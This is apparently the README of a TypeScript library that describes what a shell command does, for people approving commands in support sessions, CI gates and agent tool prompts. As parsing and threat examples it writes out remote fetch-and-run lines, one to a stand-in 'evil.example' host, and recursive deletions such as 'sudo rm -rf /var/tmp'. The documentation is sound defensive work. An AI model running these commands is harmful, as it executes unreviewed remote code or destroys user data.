# cmd-facts

Structured facts about what a command does, for the person who has to approve it and did not write it.

It exists for approval prompts: a remote support session where a customer clicks Allow, a CI gate where a release
manager signs off, an agent asking before it runs a tool, an admin console that logs who approved what. The reader is
assumed never to have opened a terminal. **It is not a man-page browser and not a linter.** It will not tell you that
`-a` does not ignore entries starting with a dot, and it will not tell you that your command could be written better.
Everything here answers one question: if this runs, what happens to this computer?

## The schema is the deliverable

`explain()` returns fields. The plain-English sentence is one rendering of those fields, not the product. A consumer
that colours a button, gates a policy or computes its own risk level reads the fields; a consumer that has to tell a
person reads `says`.

```ts
import { explain } from 'cmd-facts'

explain('curl -fsSL https://get.example.com/install.sh -o install.sh')
```

```json
{
  "facts": {
    "says": "Fetches whatever is at a web address and saves it into a file on this computer.",
    "opaque": false,
    "effect": ["read", "write", "create"],
    "reversible": "no",
    "network": "arbitrary",
    "privilege": "none",
    "touchesCredentials": false,
    "repeatSafe": true,
    "confidence": "verified",
    "source": "curated+flags",
    "note": "A file already in that place with the same name is replaced by what is downloaded.",
    "docs": "man 1 curl"
  },
  "program": "curl",
  "name": "curl",
  "key": "curl",
  "origin": "@cmd-facts/builtin",
  "args": [
    { "index": 2, "value": "https://get.example.com/install.sh", "role": "url" },
    { "index": 4, "value": "install.sh", "role": "path", "flag": "-o" }
  ],
  "escalated": ["-o"],
  "attribution": [{ "pack": "@cmd-facts/builtin", "version": "0.0.0", "trusted": true, "commands": ["curl"] }]
}
```

`-o` is a flag that changes the fact set rather than the detail: without it `curl` only reads, and with it the same
line creates and overwrites a file, which is why `says` and `note` are the ones the flag carries and `escalated`
names it. Each argument comes back with what it is, so a consumer can resolve and show the address and the path
rather than parse them out of a string.

### How a command arrives

A command usually arrives as one line — out of a log, a job file, an approval request an agent sent — so that is what
`explain` takes. A consumer that already holds a split argv can hand that in instead:

```ts
explain('rm -rf /Users/sam/Documents')
explain({ program: '/bin/rm', argv: ['rm', '-rf', '/Users/sam/Documents'] })
```

Neither form is the better one, and the second buys nothing the first does not: a row is keyed on the program's
basename either way, so `/bin/rm` and `rm` reach the same row and carry the same `confidence`.

Splitting a line into words is the one piece of reading-meaning-out-of-text this library does, so it is kept small:

- **Quoting decides where a word ends, and nothing more.** Single quotes, double quotes and backslashes are read the
  way a shell reads them, so `rm -rf "/Users/sam/My Documents"` is one path and not two.
- **Nothing is expanded.** `$HOME`, `~` and `*.log` stay the words they were written as, because what they stand for
  is not on the line. A consumer showing an argument shows what was written.
- **A line that is more than one command is refused, not split.** `curl https://x.example | sh`, `a && b`, `a; b` and
  a line with a redirection or a quote that never closes all return the widest floor, with `key: null` and a `says`
  that admits the line was not read. Explaining the part that happened to parse would be worse than admitting it.

### Fields

| Field | Meaning |
| --- | --- |
| `effect` | What it does: `read` `write` `create` `delete` `terminate` `install` `configure` `transmit` `execute` `elevate`. |
| `reversible` | `yes` `no` `with-backup` `unknown`. `yes` means there is nothing to undo or it can be put back. |
| `network` | `none` `known-host` `arbitrary` `listens`. |
| `privilege` | `none` `admin` `root`. |
| `opaque` | The command hands over to something this library cannot see. See below. |
| `touchesCredentials` | Reaches secrets by nature of the program, whatever paths it was given. |
| `repeatSafe` | Running it twice leaves the same result as running it once. |
| `confidence` / `source` | Where the answer came from, so a consumer can gate on it. |
| `says` | One sentence, plain register, standing alone with nothing templated into it. |
| `note` | A consequence the fields cannot carry, such as that deleted files do not go to the Bin. |
| `docs` | A man page or official page, so a doubtful reader can check. |
| `origin` | The pack that supplied this row, or `null` when the program is not known. |
| `attribution` | Every pack behind `facts`, including ones that only answered further down a nested line. |
| `args` | What each argv position is: `path` `host` `url` `pid` `package` `domain` `user` `mode` `service` `signal` `device` `pattern` `command` `text`. |

### `opaque` is in the type, not in a footnote

When a command runs something this library cannot see — `sh -c`, `xargs`, `find -exec`, `ssh host cmd`, `npm run`,
`npm install` and its set-up scripts, `make`, `sudo` — every other field stops being complete at that point. So an
opaque fact set has **no `effect` field at all**. It has `effectAtLeast`, and `handsOverTo` naming what it handed over
to, in the same plain register as `says`:

```ts
const { facts, args } = explain('sh -c "curl https://x.example | sh"')
```

```json
{
  "facts": {
    "says": "Runs the commands written straight into this one, one after another.",
    "opaque": true,
    "effectAtLeast": ["execute"],
    "handsOverTo": "the commands it was given, which are not shown here",
    "reversible": "unknown",
    "network": "arbitrary",
    "privilege": "none",
    "touchesCredentials": false,
    "repeatSafe": false,
    "confidence": "verified",
    "source": "curated+flags",
    "docs": "man 1 sh"
  },
  "args": [{ "index": 2, "value": "curl https://x.example | sh", "role": "command", "flag": "-c" }]
}
```

`facts.effect` does not compile here: a complete effect list is not available on an opaque row. `effectsOf(facts)`
returns `["execute"]`, the floor, reached deliberately.

Reading a complete effect list off an opaque command has to be a type error rather than a quiet mistake. Handing over
is also one-way: `merge()` will not let an opaque row be made clear again, and an opaque row can never claim to be
reversible or safe to repeat.

### The command inside the command

Where the nested command is on the same line, carried as separate words, and runs on this computer, it is looked up
with the same tables and attached as `runs`:

```ts
explain('sudo rm -rf /var/tmp')
```

```json
{
  "facts": {
    "says": "Runs another command with full control over this computer.",
    "opaque": true,
    "effectAtLeast": ["delete", "execute", "elevate"],
    "handsOverTo": "the command it was given, which then has control over everything on this computer",
    "reversible": "no",
    "privilege": "root",
    "repeatSafe": false,
    "confidence": "derived"
  },
  "runs": {
    "name": "rm",
    "key": "rm",
    "args": [{ "index": 3, "value": "/var/tmp", "role": "path" }]
  }
}
```

The inner command widened the outer one — `delete` is reachable only through `rm` — and `runs.args` indexes into the
original argv, not into a line of its own.

`sudo`, `env` (stepping over its leading `NAME=value` settings), `xargs` and `find -exec` do this. Three things it
deliberately does not do:

- **It will not split a string.** `sh -c 'curl x | sh'` and `node -e '…'` carry their command inside one argument.
  Splitting it would be reading meaning out of argument text, so those return no `runs` at all.
- **It will not follow a command onto another computer.** `ssh host rm -rf /` runs `rm` somewhere else; facts about
  this computer would be wrong.
- **It never clears the outer command.** The inner program name was not resolved to a path, and `xargs rm` will be
  handed arguments that are not on this line, so the outer command stays `opaque` and the inner facts are marked
  `confidence: derived`, `source: nested`. Nesting is followed four deep and then stops.

### `confidence` and `source`

`verified` is a hand-written row for that exact command, from a pack the consumer vouched for. `derived` is a row
that was not written for this command, or was not vouched for: a subcommand the table does not hold, falling back to
the deliberately cautious base row; a fact set that absorbed a nested command's reach; a row from a pack that was not
named in `trust`. `unknown` means there is no entry at all: the fields are then the widest ones, a floor rather than a
measurement, and `says` admits it.

A nested line is always `derived` at the top, built-in or not. The outer fact set there was computed rather than
written, and the inner program was never resolved to a path.

Provenance is also what would let an optional model-drafted tier exist honestly later: entries drafted from man pages
carry `derived` until a person has reviewed the line. See the limits below for what that tier may never be.

### `repeatSafe` is a policy input

It is not trivia. A consumer offering a standing grant — "allow this for the rest of the session" — should not offer
one for a command where `repeatSafe` is false. `git commit`, `npm install` and `curl -d` are all false here.

## Packs

A pack is a set of command rows shipped under one name. The curated table is itself a pack — `BUILTIN`, pack zero —
resolved by exactly the same path, so a row added by a consumer behaves like a row that shipped here. `explain` is
`BUILTIN` wired up and trusted; anything else goes through `createExplainer`.

```ts
import { createExplainer, BUILTIN } from 'cmd-facts'
import kubectl from './cmd-facts/packs/acme-kubectl.json' with { type: 'json' }

const explain = createExplainer({
  packs:    [BUILTIN, kubectl],
  trust:    [BUILTIN.name],
  exclude:  ['docker'],
  override: { curl: '@acme/net' },
})
```

| Option | Meaning |
| --- | --- |
| `packs` | The packs to answer from, in order. No default and no discovery; pass `BUILTIN` to get the curated table. |
| `trust` | Pack names whose rows keep the confidence they were written with. Everything else arrives `derived`. |
| `exclude` | Command names nobody answers for. They resolve to `UNKNOWN`, the widest floor, not to a substitute. |
| `override` | Command name to the pack that wins it. Required before any pack can shadow a row another pack holds. |

Everything a pack can influence is settled when `createExplainer` is called: packs are validated, conflicts resolved,
excluded names dropped, untrusted rows lowered. A misconfigured registry throws at startup rather than at the moment
someone is looking at an approval prompt, and the explainer it returns reads a flat table.

A pack is data and only data: no functions, no matchers, no hook into parsing. A pack that could run code during a
lookup would see the command line, and nothing here is allowed to read meaning out of argument text.

### Trust is the consumer's decision, never the pack's

A row from a pack not named in `trust` is lowered to `confidence: derived`, `source: plugin`. The lowering goes
through `merge()`, which can only widen, so a pack cannot raise its own confidence, clear its own opacity or soften a
row on the way in.

Trusting a pack accepts its silences as well as its claims. The dangerous shape is not a false field — the validator
and the lints catch most of those — it is an omission: a row for a tool that really does exec something, which simply
does not say so. It then explains as a tidy, transparent row, and no check can prove a tool does not exec.

### Where an answer came from

`origin` names the pack that supplied one node's row. `attribution` names every pack behind that node's `facts`,
outermost first, including the ones that only answered further down a nested line — `sudo flowctl kubectl delete` can
draw on three. A pack that answered at two depths appears once, with both rows named.

```json
[
  { "pack": "@cmd-facts/builtin", "version": "0.0.0", "trusted": true, "commands": ["sudo"] },
  { "pack": "@acme/tools", "version": "1.2.0", "trusted": false, "commands": ["flowctl"] },
  { "pack": "@acme/kube", "version": "2.4.0", "trusted": false, "commands": ["kubectl delete"] }
]
```

Gate on `confidence`, which is lowered to match the weakest link in the chain: if `facts.confidence` is `verified`,
every entry in `attribution` is `trusted`. Read `attribution` for the audit log, to record which pack said what next
to who approved it. `explain.registry.packs` lists what was loaded, which is not the same as what answered a line.

Nesting is followed four deep. A node that was still handing over when it hit that limit carries `truncated: true`,
so a log can tell "nothing further to hand over" from "stopped looking".

### Writing a pack

A pack is a `Pack`: the envelope borrows its field names from schema.org's `SoftwareSourceCode`, and `commands` holds
the rows, built with the same `fact()` and `opaqueFact()` the built-in table uses.

```ts
import { fact, opaqueFact } from 'cmd-facts'
import type { Pack } from 'cmd-facts'

export const pack: Pack = {
  name: '@acme/kube',
  version: '2.4.0',
  license: 'MIT',
  codeRepository: 'https://github.com/acme/cmd-facts-kube',
  commands: {
    kubectl: {
      facts: fact('Asks a cluster what is running on it.', { reversible: 'unknown', network: 'known-host' }),
      sub: {
        delete: {
          facts: fact('Removes something from a cluster.', {
            effect: ['delete'],
            reversible: 'no',
            network: 'known-host',
          }),
        },
      },
    },
  },
}
```

`validate(pack)` returns the problems, and `createExplainer` refuses a pack that has any. It checks the shape of a
fact set, the consistency the built-in table holds itself to (a row that deletes cannot say it can be put back; a row
that transmits cannot claim it touches no network; a base row may not promise what one of its subcommands breaks),
and the grammar that decides where parsing recurses. It does not check register or jargon: those are editorial, and a
pack should not fail to load over a sentence that reads badly. `rows(pack)` gives a pack author the same flat list
the copy lints here run over.

A pack written as JSON can be checked against `cmd-facts/schema` while it is being written. The schema is for
authoring; `validate()` is the enforcement, and it catches consistency a schema cannot express.

## What it does not do, on purpose

1. **No risk or danger score.** Risk depends on the target and the context, not on the command. `rm` on a build folder
   and `rm` on a home folder are the same command. A number shipped here would be used as policy, and it would be
   wrong. Facts here; scoring at the consumer, which knows the target.
2. **No footgun or common-mistake notes.** They are excellent in a teaching tool and corrosive in an approval prompt:
   a command carrying a warning implies the ones without are fine. `note` carries a consequence of what the command
   does, never a mistake a person might make with it.
3. **No executable undo strings.** Prose about reversibility, yes. A literal command a consumer might auto-run, no.
4. **No model and no inference at run time, now or later.** In the deployment this exists for, the command line is
   attacker-controlled, and a small model is steerable by filenames and arguments. The failure mode is a fluent,
   reassuring sentence above a dangerous command. If a heuristic over argument text would raise coverage, that is the
   instinct to resist: return nothing and let the consumer say it does not know. Nothing is ever read from the agent
   or person requesting the command, including its stated reason.

## Two decisions worth recording

**Anything added has to be added in code.** A consumer can answer for tools this package has never heard of, but
only by naming a pack in a `createExplainer` call in its own source. There is no discovery: no JSON directory, no
environment variable pointing at a file, no scan of `node_modules`, and the library reads neither disk nor network.
Anyone who could drop in a file of their own could relabel `curl evil.example | sh` as "Checks how much room is left
on each disk", which is the one thing a prompt like this must never allow. A pack that was not named in `trust`
arrives at `confidence: derived`, so a consumer gating on `verified` never auto-approves a claim nobody vouched for.

**tldr-pages is a coverage checklist only.** Its 375 macOS pages are a good list of what people actually run, and it
was used that way. No prose was copied or adapted from it, so no CC-BY attribution obligation is incurred. Its writing
is developer-voiced and would be the wrong register here anyway.

## This repository

```
packages/cmd-facts/   the library; nothing else is published
```

A landing page will live alongside it. The library stays free of anything the page needs.

## Adding a command

Rows live in `packages/cmd-facts/src/data/`. `fact()` builds a row for a command the library can account for in full; `opaqueFact()`
builds one for a command that hands over, and requires you to name what it hands over to.

The register is enforced by tests, not by review alone. `pnpm test` checks that every sentence is one sentence, ends
in a full stop, stays under 150 characters, avoids a list of terms that assume the reader already knows what a command
is (`folder`, not `directory`; `program`, not `binary`), carries no verdict about safety, does not explain a program by
repeating its name, and holds no string that could be lifted out and run. It also checks the facts hold together: a row
with `effect: delete` cannot be `reversible: yes`, a base row cannot be more permissive than any subcommand it stands
in for, and every row points at something a doubtful reader can check.

```bash
pnpm test && pnpm typecheck
```

No runtime dependencies, and there will not be any: this gets embedded in applications that approve commands, so the
dependency footprint is part of the product.

MIT.
